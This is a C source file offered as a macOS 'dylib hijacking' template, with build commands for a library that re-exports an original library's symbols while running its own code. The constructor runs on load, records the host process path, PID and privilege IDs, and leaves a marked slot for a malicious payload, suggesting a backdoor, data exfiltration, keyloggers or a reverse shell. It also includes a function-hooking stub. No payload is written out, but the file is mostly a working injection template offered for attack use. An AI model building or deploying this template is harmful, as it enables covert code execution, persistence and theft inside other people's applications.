//
// Dylib Hijacking Template
//
// This template demonstrates how to create a "hijacking" dylib that
// re-exports symbols from an original library while adding malicious functionality.
//
// Compilation:
// gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 \
//     -framework Foundation hijack_template.c \
//     -Wl,-reexport_library,/path/to/original.dylib \
//     -o hijack.dylib
//
// After compilation, fix the path:
// install_name_tool -change @rpath/original.dylib /absolute/path/to/original.dylib hijack.dylib
//

#include <stdio.h>
#include <stdlib.h>
#include <syslog.h>
#include <unistd.h>
#include <dlfcn.h>
#include <mach-o/dyld.h>
#include <string.h>

// Path to the original dylib (update this with the actual path)
#define ORIGINAL_DYLIB "/path/to/original.dylib"

// Handle to the original dylib if we need to load it manually
static void *original_handle = NULL;

// Function to get the path of the executable
char* get_executable_path() {
    char* path = malloc(PATH_MAX);
    uint32_t size = PATH_MAX;
    
    if (_NSGetExecutablePath(path, &size) == 0) {
        return path;
    } else {
        free(path);
        path = malloc(size);
        _NSGetExecutablePath(path, &size);
        return path;
    }
}

// Function that runs when the dylib is loaded
__attribute__((constructor))
static void initialize(int argc, const char **argv) {
    // Get process info
    char* exec_path = get_executable_path();
    pid_t pid = getpid();
    
    // Log the hijack success
    printf("[+] Dylib hijack successful in %s (PID: %d)\n", exec_path, pid);
    syslog(LOG_ERR, "[+] Dylib hijack successful in %s (PID: %d)\n", exec_path, pid);
    
    // Optional: If not using -Wl,-reexport_library during compilation,
    // manually load the original dylib
    /*
    original_handle = dlopen(ORIGINAL_DYLIB, RTLD_LAZY);
    if (!original_handle) {
        syslog(LOG_ERR, "[-] Failed to load original dylib: %s\n", dlerror());
        // We might want to exit here to avoid crashing the application
        // or we could continue if we're only intercepting specific functions
    }
    */
    
    // Get UID/EUID for privilege information
    uid_t uid = getuid();
    uid_t euid = geteuid();
    syslog(LOG_ERR, "[+] Running with UID=%d, EUID=%d\n", uid, euid);
    
    // Add your malicious payload here
    // For example, you could:
    // 1. Create a persistent backdoor
    // 2. Exfiltrate sensitive data
    // 3. Modify application behavior
    // 4. Install keyloggers
    // 5. Create a reverse shell
    
    free(exec_path);
}

// Optional: Function to hook/intercept specific functions from the original library
// Example of function hooking for demonstration purposes
/*
// Define the prototype of the function we want to hook
typedef int (*original_function_t)(const char *path);

// Our replacement function
int hooked_function(const char *path) {
    // Log the call
    syslog(LOG_ERR, "[+] hooked_function called with path: %s\n", path);
    
    // Call the original function
    original_function_t original_func = dlsym(original_handle, "original_function");
    if (original_func) {
        return original_func(path);
    } else {
        // Handle error or provide alternative implementation
        return -1;
    }
}
*/

// Function that runs when the dylib is unloaded
__attribute__((destructor))
static void cleanup(void) {
    syslog(LOG_ERR, "[+] Dylib being unloaded\n");
    
    // Close handle to original dylib if opened manually
    if (original_handle) {
        dlclose(original_handle);
    }
}